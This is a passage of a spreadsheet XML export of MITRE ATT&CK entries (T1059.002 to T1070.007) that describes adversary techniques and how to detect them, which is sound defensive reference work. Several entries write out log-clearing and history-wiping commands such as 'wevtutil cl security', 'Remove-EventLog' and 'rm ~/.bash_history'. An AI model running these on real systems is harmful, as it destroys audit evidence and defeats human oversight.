Consider monitoring for Windows event ID (EID) 400, which shows the version of PowerShell executing in the &lt;code&gt;EngineVersion&lt;/code&gt; field (which may also be relevant to detecting a potential [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)) as well as if PowerShell is running locally or remotely in the &lt;code&gt;HostName&lt;/code&gt; field. Furthermore, EID 400 may indicate the start time and EID 403 indicates the end time of a PowerShell session.(Citation: inv_ps_attacks)</t>
  </si>
  <si>
    <t>T1059.002</t>
  </si>
  <si>
    <t>AppleScript (T1059.002)</t>
  </si>
  <si>
    <t>Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.
Scripts can be run from the command-line via &lt;code&gt;osascript /path/to/script&lt;/code&gt; or &lt;code&gt;osascript -e "script here"&lt;/code&gt;. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding &lt;code&gt;#!/usr/bin/osascript&lt;/code&gt; to the start of the script file.(Citation: SentinelOne AppleScript)
AppleScripts do not need to call &lt;code&gt;osascript&lt;/code&gt; to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s &lt;code&gt;NSAppleScript&lt;/code&gt; or &lt;code&gt;OSAScript&lt;/code&gt;, both of which execute code independent of the &lt;code&gt;/usr/bin/osascript&lt;/code&gt; command line utility.
Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)</t>
  </si>
  <si>
    <t>Monitor for execution of AppleScript through &lt;code&gt;osascript&lt;/code&gt; and usage of the &lt;code&gt;NSAppleScript&lt;/code&gt; and &lt;code&gt;OSAScript&lt;/code&gt; APIs that may be related to other suspicious behavior occurring on the system. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.
Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts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t>
  </si>
  <si>
    <t>T1059.003</t>
  </si>
  <si>
    <t>Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd](https://attack.mitre.org/software/S0106)) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation: SSH in Windows)
Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.
Adversaries may leverage [cmd](https://attack.mitre.org/software/S0106) to execute various commands and payloads. Common uses include [cmd](https://attack.mitre.org/software/S0106) to execute a single command, or abusing [cmd](https://attack.mitre.org/software/S0106) interactively with input and output forwarded over a command and control channel.</t>
  </si>
  <si>
    <t>Usage of the Windows command shell may be common on administrator, developer, or power user systems depending on job function. If scripting is restricted for normal users, then any attempt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
Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.</t>
  </si>
  <si>
    <t>T1059.004</t>
  </si>
  <si>
    <t>Unix Shell (T1059.004)</t>
  </si>
  <si>
    <t>Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc.) depending on the specific OS or distribution.(Citation: DieNet Bash)(Citation: Apple ZShell) Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.
Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.
Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with [SSH](https://attack.mitre.org/techniques/T1021/004). Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.</t>
  </si>
  <si>
    <t xml:space="preserve">Unix shell usage may be common on administrator, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempt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
Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script. </t>
  </si>
  <si>
    <t>T1059.005</t>
  </si>
  <si>
    <t>Command: Command Execution, Module: Module Load, Process: Process Creation, Script: Script Execution</t>
  </si>
  <si>
    <t>Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and the [Native API](https://attack.mitre.org/techniques/T1106) through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.(Citation: VB .NET Mar 2020)(Citation: VB Microsoft)
Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications.(Citation: Microsoft VBA)(Citation: Wikipedia VBA) VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of [JavaScript](https://attack.mitre.org/techniques/T1059/007) on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).(Citation: Microsoft VBScript)
Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) payloads (which may also involve [Mark-of-the-Web Bypass](https://attack.mitre.org/techniques/T1553/005) to enable execution).(Citation: Default VBS macros Blocking )</t>
  </si>
  <si>
    <t>Monitor for events associated with VB execution, such as Office applications spawning processes, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving VB payloads or scripts, or loading of modules associated with VB languages (ex: vbscript.dll). VB execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programable post-compromise behaviors and could be used as indicators of detection leading back to the source.
Understanding standard usage patterns is important to avoid a high number of false positives. If VB execution is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If VB execution is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Payloads and scripts should be captured from the file system when possible to determine their actions and intent.</t>
  </si>
  <si>
    <t>T1059.006</t>
  </si>
  <si>
    <t>Python (T1059.006)</t>
  </si>
  <si>
    <t>Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the &lt;code&gt;python.exe&lt;/code&gt; interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020)
Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.</t>
  </si>
  <si>
    <t>Monitor systems for abnormal Python usage and python.exe behavior, which could be an indicator of malicious activity. Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts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
Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.</t>
  </si>
  <si>
    <t>T1059.007</t>
  </si>
  <si>
    <t>Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)
JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)
JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility &lt;code&gt;osascript&lt;/code&gt;, they can be compiled into applications or script files via &lt;code&gt;osacompile&lt;/code&gt;, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)
Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).</t>
  </si>
  <si>
    <t>Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.
Monitor for execution of JXA through &lt;code&gt;osascript&lt;/code&gt; and usage of &lt;code&gt;OSAScript&lt;/code&gt; API that may be related to other suspicious behavior occurring on the system.
Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.</t>
  </si>
  <si>
    <t>T1059.008</t>
  </si>
  <si>
    <t>Network Device CLI (T1059.008)</t>
  </si>
  <si>
    <t>Network</t>
  </si>
  <si>
    <t>Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands. 
Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH](https://attack.mitre.org/techniques/T1021/004).
Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.(Citation: Cisco Synful Knock Evolution)</t>
  </si>
  <si>
    <t>Consider reviewing command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration.(Citation: Cisco IOS Software Integrity Assurance - Command History)
Consider comparing a copy of the network device configuration against a known-good version to discover unauthorized changes to the command interpreter. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.</t>
  </si>
  <si>
    <t>T1059.009</t>
  </si>
  <si>
    <t>Cloud API (T1059.009)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  
Cloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.
With proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  </t>
  </si>
  <si>
    <t>T1059.010</t>
  </si>
  <si>
    <t>AutoHotKey &amp; AutoIT (T1059.010)</t>
  </si>
  <si>
    <t>Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.(Citation: AutoIT)(Citation: AutoHotKey)
Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as [Phishing](https://attack.mitre.org/techniques/T1566) payloads.(Citation: Splunk DarkGate)
These scripts may also be compiled into self-contained executable payloads (`.exe`).(Citation: AutoIT)(Citation: AutoHotKey)</t>
  </si>
  <si>
    <t>T1059.011</t>
  </si>
  <si>
    <t>Lua (T1059.011)</t>
  </si>
  <si>
    <t>Command: Command Execution, Script: Script Execution</t>
  </si>
  <si>
    <t>Adversaries may abuse Lua commands and scripts for execution. Lua is a cross-platform scripting and programming language primarily designed for embedded use in applications. Lua can be executed on the command-line (through the stand-alone lua interpreter), via scripts (&lt;code&gt;.lua&lt;/code&gt;), or from Lua-embedded programs (through the &lt;code&gt;struct lua_State&lt;/code&gt;).(Citation: Lua main page)(Citation: Lua state)
Lua scripts may be executed by adversaries for malicious purposes. Adversaries may incorporate, abuse, or replace existing Lua interpreters to allow for malicious Lua command execution at runtime.(Citation: PoetRat Lua)(Citation: Lua Proofpoint Sunseed)(Citation: Cyphort EvilBunny)(Citation: Kaspersky Lua)</t>
  </si>
  <si>
    <t>T1068</t>
  </si>
  <si>
    <t>Driver: Driver Load, Process: Process Creation</t>
  </si>
  <si>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include use of software exploitation to circumvent those restrictions.
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component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.
Adversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).</t>
  </si>
  <si>
    <t>Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the endpoint system that might indicate successful compromise, such as abnormal behavior of the processes. This could include suspicious files written to disk, evidence of [Process Injection](https://attack.mitre.org/techniques/T1055) for attempts to hide execution or evidence of Discovery. Consider monitoring for the presence or loading (ex: Sysmon Event ID 6) of known vulnerable drivers that adversaries may drop and exploit to execute code in kernel mode.(Citation: Microsoft Driver Block Rules)
Higher privileges are often necessary to perform additional actions such as some methods of [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Look for additional activity that may indicate an adversary has gained higher privileges.</t>
  </si>
  <si>
    <t>T1069</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, Group: Group Enumeration, Group: Group Metadata, Process: Process Creation</t>
  </si>
  <si>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</si>
  <si>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container logs for commands and/or API calls related to listing permissions for pods and nodes, such as &lt;code&gt;kubectl auth can-i&lt;/code&gt;.(Citation: K8s Authorization Overview)</t>
  </si>
  <si>
    <t>T1069.001</t>
  </si>
  <si>
    <t>Command: Command Execution, Group: Group Enumeration, Process: OS API Execution, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may attempt to find local system groups and permission settings. The knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.
Commands such as &lt;code&gt;net localgroup&lt;/code&gt; of the [Net](https://attack.mitre.org/software/S0039) utility, &lt;code&gt;dscl . -list /Groups&lt;/code&gt; on macOS, and &lt;code&gt;groups&lt;/code&gt; on Linux can list local groups.</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</si>
  <si>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</si>
  <si>
    <t>T1069.002</t>
  </si>
  <si>
    <t>Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.
Commands such as &lt;code&gt;net group /domain&lt;/code&gt; of the [Net](https://attack.mitre.org/software/S0039) utility,  &lt;code&gt;dscacheutil -q group&lt;/code&gt; on macOS, and &lt;code&gt;ldapsearch&lt;/code&gt; on Linux can list domain-level groups.</t>
  </si>
  <si>
    <t>T1069.003</t>
  </si>
  <si>
    <t>Adversaries may attempt to find cloud groups and permission settings. The knowledge of cloud permission groups can help adversaries determine the particular roles of users and groups within an environment, as well as which users are associated with a particular group.
With authenticated access there are several tools that can be used to find permissions groups. The &lt;code&gt;Get-MsolRole&lt;/code&gt; PowerShell cmdlet can be used to obtain roles and permissions groups for Exchange and Office 365 accounts (Citation: Microsoft Msolrole)(Citation: GitHub Raindance).
Azure CLI (AZ CLI) and the Google Cloud Identity Provider API also provide interfaces to obtain permissions groups. The command &lt;code&gt;az ad user get-member-groups&lt;/code&gt; will list groups associated to a user account for Azure while the API endpoint &lt;code&gt;GET https://cloudidentity.googleapis.com/v1/groups&lt;/code&gt; lists group resources available to a user for Google.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018)(Citation: Google Cloud Identity API Documentation) In AWS, the commands `ListRolePolicies` and `ListAttachedRolePolicies` allow users to enumerate the policies attached to a role.(Citation: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022)
Adversaries may attempt to list ACLs for objects to determine the owner and other accounts with access to the object, for example, via the AWS &lt;code&gt;GetBucketAcl&lt;/code&gt; API (Citation: AWS Get Bucket ACL). Using this information an adversary can target accounts with permissions to a given object or leverage accounts they have already compromised to access the object.</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</si>
  <si>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Activity and account logs for the cloud services can also be monitored for suspicious commands that are anomalous compared to a baseline of normal activity.</t>
  </si>
  <si>
    <t>T1070</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, File: File Deletion, File: File Metadata, File: File Modification, Firewall: Firewall Rule Modification, Network Traffic: Network Traffic Content, Process: OS API Execution, Process: Process Creation, Scheduled Job: Scheduled Job Modification, User Account: User Account Authentication, User Account: User Account Deletion, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Containers, Linux, Network, Office Suite, Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.
Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.</t>
  </si>
  <si>
    <t>File system monitoring may be used to detect improper deletion or modification of indicator files.  Events not stored on the file system may require different detection mechanisms.</t>
  </si>
  <si>
    <t>T1070.001</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Deletion, Process: OS API Execution, Process: Process Creation</t>
  </si>
  <si>
    <t>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
With administrator privileges, the event logs can be cleared with the following utility commands:
* &lt;code&gt;wevtutil cl system&lt;/code&gt;
* &lt;code&gt;wevtutil cl application&lt;/code&gt;
* &lt;code&gt;wevtutil cl security&lt;/code&gt;
These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command &lt;code&gt;Remove-EventLog -LogName Security&lt;/code&gt; to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)
Adversaries may also attempt to clear logs by directly deleting the stored log files within `C:\Windows\System32\winevt\logs\`.</t>
  </si>
  <si>
    <t>Deleting Windows event logs (via native binaries (Citation: Microsoft wevtutil Oct 2017), API functions (Citation: Microsoft EventLog.Clear), or [PowerShell](https://attack.mitre.org/techniques/T1059/001) (Citation: Microsoft Clear-EventLog)) may also generate an alterable event (Event ID 1102: "The audit log was cleared").</t>
  </si>
  <si>
    <t>T1070.002</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Deletion, File: File Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the &lt;code&gt;/var/log/&lt;/code&gt; directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)
* &lt;code&gt;/var/log/messages:&lt;/code&gt;: General and system-related messages
* &lt;code&gt;/var/log/secure&lt;/code&gt; or &lt;code&gt;/var/log/auth.log&lt;/code&gt;: Authentication logs
* &lt;code&gt;/var/log/utmp&lt;/code&gt; or &lt;code&gt;/var/log/wtmp&lt;/code&gt;: Login records
* &lt;code&gt;/var/log/kern.log&lt;/code&gt;: Kernel logs
* &lt;code&gt;/var/log/cron.log&lt;/code&gt;: Crond logs
* &lt;code&gt;/var/log/maillog&lt;/code&gt;: Mail server logs
* &lt;code&gt;/var/log/httpd/&lt;/code&gt;: Web server access and error logs
</t>
  </si>
  <si>
    <t>File system monitoring may be used to detect improper deletion or modification of indicator files. Also monitor for suspicious processes interacting with log files.</t>
  </si>
  <si>
    <t>T1070.003</t>
  </si>
  <si>
    <t>Clear Command History (T1070.003)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Deletion, File: File Modification, Process: Process Creation, User Account: User Account Authentication</t>
  </si>
  <si>
    <t>In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.
On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable &lt;code&gt;HISTFILE&lt;/code&gt;. When a user logs off a system, this information is flushed to a file in the user's home directory called &lt;code&gt;~/.bash_history&lt;/code&gt;. The benefit of this is that it allows users to go back to commands they've used before in different sessions.
Adversaries may delete their commands from these logs by manually clearing the history (&lt;code&gt;history -c&lt;/code&gt;) or deleting the bash history file &lt;code&gt;rm ~/.bash_history&lt;/code&gt;.  
Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to clear command history data (&lt;code&gt;clear logging&lt;/code&gt; and/or &lt;code&gt;clear history&lt;/code&gt;).(Citation: US-CERT-TA18-106A)
On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the &lt;code&gt;PSReadLine&lt;/code&gt; module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.
The &lt;code&gt;PSReadLine&lt;/code&gt; command history tracks the commands used in all PowerShell sessions and writes them to a file (&lt;code&gt;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&lt;/code&gt; by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History)
Adversaries may run the PowerShell command &lt;code&gt;Clear-History&lt;/code&gt; to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the &lt;code&gt;ConsoleHost_history.txt&lt;/code&gt; file. Adversaries may also delete the &lt;code&gt;ConsoleHost_history.txt&lt;/code&gt; file or edit its contents to hide PowerShell commands they have run.(Citation: Sophos PowerShell command audit)(Citation: Sophos PowerShell Command History Forensics)</t>
  </si>
  <si>
    <t>User authentication, especially via remote terminal services like SSH, without new entries in that user's &lt;code&gt;~/.bash_history&lt;/code&gt; is suspicious. Additionally, the removal/clearing of the &lt;code&gt;~/.bash_history&lt;/code&gt; file can be an indicator of suspicious activity.
Monitor for suspicious modifications or deletion of &lt;code&gt;ConsoleHost_history.txt&lt;/code&gt; and use of the &lt;code&gt;Clear-History&lt;/code&gt; command.</t>
  </si>
  <si>
    <t>T1070.004</t>
  </si>
  <si>
    <t>File Deletion (T1070.004)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Deletion</t>
  </si>
  <si>
    <t>Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.
There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include &lt;code&gt;del&lt;/code&gt; on Windows and &lt;code&gt;rm&lt;/code&gt; or &lt;code&gt;unlink&lt;/code&gt; on Linux and macOS.</t>
  </si>
  <si>
    <t>It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.</t>
  </si>
  <si>
    <t>T1070.005</t>
  </si>
  <si>
    <t>Network Share Connection Removal (T1070.005)</t>
  </si>
  <si>
    <t>Command: Command Execution, Network Traffic: Network Traffic Content, Process: Process Creation, User Account: User Account Authentication</t>
  </si>
  <si>
    <t>Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) connections can be removed when no longer needed. [Net](https://attack.mitre.org/software/S0039) is an example utility that can be used to remove network share connections with the &lt;code&gt;net use \\system\share /delete&lt;/code&gt; command. (Citation: Technet Net Use)</t>
  </si>
  <si>
    <t>Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of &lt;code&gt;net use&lt;/code&gt; commands associated with establishing and removing remote shares over SMB, including following best practices for detection of [Windows Admin Shares](https://attack.mitre.org/techniques/T1077). SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.</t>
  </si>
  <si>
    <t>T1070.006</t>
  </si>
  <si>
    <t>Timestomp (T1070.006)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Metadata, File: File Modification, Process: OS API Execution</t>
  </si>
  <si>
    <t>Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.
Both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes record times in a Master File Table (MFT) file.(Citation: Inversecos Timestomping 2022) `$SI` (dates/time stamps) is displayed to the end user, including in the File System view, while `$FN` is dealt with by the kernel.(Citation: Magnet Forensics)
Modifying the `$SI` attribute is the most common method of timestomping because it can be modified at the user level using API calls. `$FN` timestomping, however, typically requires interacting with the system kernel or moving or renaming a file.(Citation: Inversecos Timestomping 2022)
Adversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the `$SI` and `$FN` attributes, adversaries may also engage in “double timestomping” by modifying times on both attributes simultaneously.(Citation: Double Timestomping)
Timestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)</t>
  </si>
  <si>
    <t>Forensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.</t>
  </si>
  <si>
    <t>T1070.007</t>
  </si>
  <si>
    <t>Clear Network Connection History and Configurations (T1070.007)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification, Firewall: Firewall Rule Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>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connections, such as [Remote Services](https://attack.mitre.org/techniques/T1021) or [External Remote Services](https://attack.mitre.org/techniques/T1133). Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.
